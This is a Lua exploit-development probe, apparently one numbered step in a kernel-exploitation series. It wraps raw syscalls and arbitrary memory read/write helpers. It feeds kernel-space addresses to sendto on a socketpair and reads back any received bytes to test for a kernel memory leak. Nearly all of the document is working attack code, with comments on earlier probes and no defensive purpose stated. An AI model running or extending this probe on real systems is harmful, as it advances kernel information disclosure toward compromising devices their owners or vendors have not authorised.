-- CRASH_CLASS: MODERATE
-- PROBE 980a: does write(2)/sendto copyin accept a kernel source address?
--
-- 979a showed the aio submit refuses a kernel buffer (state stays 1 for every
-- cmd that otherwise dispatches), so the worker's copyin is gated. This asks the
-- same question of the ordinary socket paths, which reach the copyin primitive
-- directly. If any call returns a positive count instead of EFAULT, kernel
-- memory reached our socket and we can read it back.

print("=== PROBE 980a: COPYIN WITH A KERNEL SOURCE ===")
print("")
local function to_num(v)
    if type(v)=="table" and v.tonumber then return v:tonumber() end
    if type(v)=="table" and v.h then return v.h*4294967296+v.l end
    return tonumber(v) or 0
end
local function mk(n) local t={} for k,v in pairs(syscall.pipe) do t[k]=v end t.syscall_no=n setmetatable(t,getmetatable(syscall.pipe)) return t end
local function hi_lo(v) if type(v)=="table" and v.h then return v.h,v.l end return 0,to_num(v) end
local function rd(a) local o,v=pcall(function() return to_num(memory.read_dword(a)) end) if o then return v end return -999 end
local function wd(a,v) pcall(function() memory.write_dword(a,v) end) end
local function addr_of(t) local s=tostring(t) local m=s:match("0x(%x+)") if m then return tonumber(m,16) end return to_num(t) end
local function rets(tag, ok, rv) if not ok then print("  ["..tag.."] PCALL-FAIL") return nil end local h,l=hi_lo(rv) print(string.format("  [%s] ret=0x%08X_%08X", tag, h, l)) return l end

local pid = to_num(mk(20)())
print(string.format("[A] pid=%u", pid))
local sv = memory.alloc(8) wd(sv,0) wd(sv+4,0)
pcall(function() return mk(135)(uint64(1),uint64(1),uint64(0),uint64(sv)) end)
local fd0, fd1 = rd(sv), rd(sv+4)
print(string.format("  fds=%d,%d", fd0, fd1))
if fd0 <= 0 then print("no socketpair"); return end

local user = memory.alloc(0x40)
for i=0,0x3F,4 do wd(user+i, 0x55555555) end
local ub = addr_of(user)
local out = memory.alloc(0x200)

local addrs = {
    {name="user",     v=ub},
    {name="ktext_hi", v=0xFFFFFFFF80000000},
    {name="ktext_mid",v=0xFFFFFF8040000000},
    {name="kdata_lo", v=0xFFFFFFC000000000},
    {name="zero_ku",  v=0xFFFF800000000000},
}

for _, a in ipairs(addrs) do
    -- write(6?) no: use sendto(133) with a destination-less socketpair
    local ok, rv = pcall(function() return mk(133)(uint64(fd0), uint64(a.v), uint64(0x20), uint64(0x80)) end)
    local l = rets("sendto "..a.name, ok, rv)
    local got = -1
    local o2, rv2 = pcall(function() return mk(29)(uint64(fd1),uint64(addr_of(out)),uint64(0x100),uint64(0x80)) end)
    if o2 then got = to_num(rv2) end
    print(string.format("     -> recv %d", got))
    if got and got > 0 then
        for i=0,math.min(got,32)-1,4 do print(string.format("        [%02X] %08X", i, rd(out+i))) end
    end
end

print(string.format("[Z] alive pid=%d", to_num(mk(20)())))
print("=== COMPLETE ===")
